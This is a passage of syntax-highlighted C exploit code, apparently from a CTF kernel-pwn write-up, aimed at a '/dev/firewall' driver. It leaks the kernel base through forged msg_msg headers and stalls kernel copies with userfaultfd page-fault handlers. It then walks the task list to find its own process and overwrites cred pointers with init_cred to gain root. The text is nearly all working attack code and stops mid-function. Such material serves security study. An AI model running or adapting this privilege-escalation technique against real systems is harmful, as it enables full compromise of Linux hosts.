class="keyword">char</span> *page2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">pthread_t</span> td[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> is_write_msg=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;exp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;31m %s\e[0m\n&quot;</span>,err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%d.%d.%d.%d\n&quot;,(ip&amp;0xff),(ip&amp;0x0000ff00)&gt;&gt;8,(ip&amp;0x00ff0000)&gt;&gt;16,(ip&amp;0xff000000)&gt;&gt;24);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;add fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">uint64_t</span> fault_page, <span class="keyword">uint64_t</span> fault_page_len, <span class="keyword">void</span> *(*func)(<span class="keyword">void</span> *), <span class="keyword">pthread_t</span> *thr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">  <span class="comment">// pthread_t thr;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">  ua.api = UFFD_API;</span><br><span class="line">  ua.features = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">  ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">  ur.range.len   = fault_page_len;</span><br><span class="line">  ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);  </span><br><span class="line">  <span class="keyword">int</span> s = pthread_create(thr, <span class="literal">NULL</span>, func, (<span class="keyword">void</span>*)uffd); </span><br><span class="line">  <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// handler1(): put forged data on (page_1+0x1000), QID #2&#x27;s msg.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler_write_msg</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg1</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] handler_write_msg created&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="keyword">int</span> nready;</span><br><span class="line">  pollfd.fd      = uffd;</span><br><span class="line">  pollfd.events  = POLLIN;</span><br><span class="line">  nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (nready != <span class="number">1</span>)  <span class="comment">// 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(uffd, &amp;msg1, <span class="keyword">sizeof</span>(msg1)) != <span class="keyword">sizeof</span>(msg1)) <span class="comment">// 从uffd读取msg结构，虽然没用</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Error in reading uffd_msg&quot;</span>);</span><br><span class="line">  assert(msg1.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">  <span class="keyword">if</span> (msg1.arg.pagefault.address == (page1 + page_size))</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] page fault 1 at page1+0x1000\n&quot;</span>);</span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">0x2000</span>];  <span class="comment">// 预先设置好buffer内容，往缺页处进行拷贝</span></span><br><span class="line">      <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      msg_header fake_msg_header;</span><br><span class="line">      fake_msg_header.m_type = <span class="number">1</span>;</span><br><span class="line">      fake_msg_header.m_ts   = <span class="number">0x1000</span>;</span><br><span class="line">      fake_msg_header.next   = current_task+<span class="number">0x538</span><span class="number">-0x8</span>;</span><br><span class="line">      <span class="built_in">memcpy</span>(buffer+<span class="number">0xfd0</span><span class="number">-0x8</span>, (<span class="keyword">void</span> *)&amp;fake_msg_header, <span class="keyword">sizeof</span>(msg_header));  <span class="comment">// msg_msgseg.next - 8 bytes (we should skip this 8 bytes)</span></span><br><span class="line">    <span class="comment">//   memset(buffer,0x61,0x2000);</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">      uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buffer;</span><br><span class="line">      uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page1+page_size; <span class="comment">// (unsigned long) msg1.arg.pagefault.address &amp; ~(page_size - 1);</span></span><br><span class="line">      uc.len = <span class="number">0x1000</span>;</span><br><span class="line">      uc.mode = <span class="number">0</span>;</span><br><span class="line">      uc.copy = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">//   printf(&quot;asdf\n&quot;);</span></span><br><span class="line">          <span class="keyword">if</span> (is_write_msg)</span><br><span class="line">          &#123;</span><br><span class="line">              ioctl(uffd, UFFDIO_COPY, &amp;uc); <span class="comment">// 恢复执行copy_from_user</span></span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;write msg ok\n&quot;</span>);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler_write_task</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg1</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] handler_write_task created&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="keyword">int</span> nready;</span><br><span class="line">  pollfd.fd      = uffd;</span><br><span class="line">  pollfd.events  = POLLIN;</span><br><span class="line">  nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (nready != <span class="number">1</span>)  <span class="comment">// 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(uffd, &amp;msg1, <span class="keyword">sizeof</span>(msg1)) != <span class="keyword">sizeof</span>(msg1))  <span class="comment">// 从uffd读取msg结构，虽然没用</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Error in reading uffd_msg&quot;</span>);</span><br><span class="line">  assert(msg1.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (msg1.arg.pagefault.address == (page2 + page_size))</span><br><span class="line">  &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+] page fault 2 at page2+0x1000\n&quot;</span>);</span><br><span class="line">      is_write_msg = <span class="number">1</span>;                                <span class="comment">// wait for page fault 1</span></span><br><span class="line">      sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//   pthread_join(td[0],NULL);</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] msg next write is ok\n&quot;</span>);</span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">0x2000</span>]; </span><br><span class="line">      *(<span class="keyword">size_t</span> *)(buffer+<span class="number">0x1000</span><span class="number">-0x30</span>)=init_cred;</span><br><span class="line">      *(<span class="keyword">size_t</span> *)(buffer+<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">8</span>)=init_cred;</span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">      uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buffer;</span><br><span class="line">      uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page2+page_size; <span class="comment">// (unsigned long) msg1.arg.pagefault.address &amp; ~(page_size - 1);</span></span><br><span class="line">      uc.len = <span class="number">0x1000</span>;</span><br><span class="line">      uc.mode = <span class="number">0</span>;</span><br><span class="line">      uc.copy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      ioctl(uffd, UFFDIO_COPY, &amp;uc); <span class="comment">// 恢复执行copy_from_user</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write task ok\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;33m debug\e[0m\n&quot;</span>);</span><br><span class="line">    add_rule(fd,<span class="number">3</span>,INBOUND);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_current_task</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    <span class="keyword">char</span> re_buf[<span class="number">0x2000</span>];</span><br><span class="line">    current_task=init_task;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x2000</span>;</span><br><span class="line">    </span><br><span class="line">    fake_msg_header.next=current_task+<span class="number">0x290</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    pid=*(<span class="keyword">int</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x100</span>);</span><br><span class="line">    prev_task=*(<span class="keyword">size_t</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x8</span>)<span class="number">-0x298</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m pid:%d  getpid:%d \e[0m\n&quot;</span>,pid,getpid());</span><br><span class="line">    <span class="keyword">while</span>(pid!=getpid())&#123;</span><br><span class="line">        current_task=prev_task;</span><br><span class="line">        fake_msg_header.next=current_task+<span class="number">0x290</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">        pid=*(<span class="keyword">int</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x100</span>);</span><br><span class="line">        prev_task=*(<span class="keyword">size_t</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x8</span>)<span class="number">-0x298</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m pid:%d  getpid:%d \e[0m\n&quot;</span>,pid,getpid());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_page_msg_next</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    *(<span class="keyword">size_t</span> *)(page1+<span class="number">0x1000</span><span class="number">-0x8</span>)=<span class="number">0x1</span>;</span><br><span class="line">    send_msg(msg_id[<span class="number">2</span>],page1+<span class="number">0x1000</span><span class="number">-0x8</span>,<span class="number">0x2000</span><span class="number">-0x8</span><span class="number">-0x30</span>,IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_page_msg</span><span class="params">()</span></span>&#123;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(page2+<span class="number">0x1000</span><span class="number">-0x8</span>)=<span class="number">0x1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get_page_msg\n&quot;</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">2</span>],page2+<span class="number">0x1000</span><span class="number">-0x8</span>,<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    user_msg *msg=(user_msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    page1=(<span class="keyword">char</span> *)mmap(<span class="number">0x200000</span>,<span class="number">0x3000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    page2=(<span class="keyword">char</span> *)mmap(<span class="number">0x300000</span>,<span class="number">0x3000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>((!page1)||(!page2))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    register_userfault(page1+<span class="number">0x1000</span>,<span class="number">0x1000</span>,handler_write_msg,&amp;td[<span class="number">0</span>]);</span><br><span class="line">    register_userfault(page2+<span class="number">0x1000</span>,<span class="number">0x1000</span>,handler_write_task,&amp;td[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">10</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        add_rule(fd,i,INBOUND);</span><br><span class="line">    &#125;</span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1fc8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x2000</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">0</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(re_buf[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] %p\n&quot;</span>,re_buf[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>,<span class="number">0x10</span>))&amp;&amp;(!<span class="built_in">queue</span>))&#123;</span><br><span class="line">            <span class="built_in">queue</span>=re_buf[i<span class="number">-5</span>];</span><br><span class="line">            page_msg=re_buf[i<span class="number">-6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(((re_buf[i]&amp;<span class="number">0xffff</span>)==<span class="number">0x1520</span>)&amp;&amp;(!kernelbase))&#123; <span class="comment">//error_injection_list</span></span><br><span class="line">            kernelbase=re_buf[i]<span class="number">-0xc41520</span>;</span><br><span class="line">            init_task=kernelbase+<span class="number">0xc124c0</span>;</span><br><span class="line">            init_cred=kernelbase+<span class="number">0xc33060</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>&amp;&amp;kernelbase)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m msg_queue_addr:%p \e[0m\n&quot;</span>,<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m page_msg_addr:%p \e[0m\n&quot;</span>,page_msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m kernelbase_addr:%p \e[0m\n&quot;</span>,kernelbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_task_addr:%p \e[0m\n&quot;</span>,init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_cred_addr:%p \e[0m\n&quot;</span>,init_cred);</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">queue</span>)||(!kernelbase))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;get queue fail or kernelbase fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_current_task();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m current_task_addr:%p \e[0m\n&quot;</span>,current_task);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.先釋放4K的msg</span></span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x10</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x1fc8</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.然後再把他們申請回來,並且通過userfault卡住</span></span><br><span class="line">    </span><br><span class="line">    pthread_create(&amp;td[<span class="number">2</span>],<span class="literal">NULL</span>,get_page_msg_next,<span class="literal">NULL</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//3.然後再把msg的段通過我們控制的msg給釋放掉</span></span><br><span class="line">    fake_msg_header.ll_next=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header.ll_prev=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x10</span>;</span><br><span class="line">  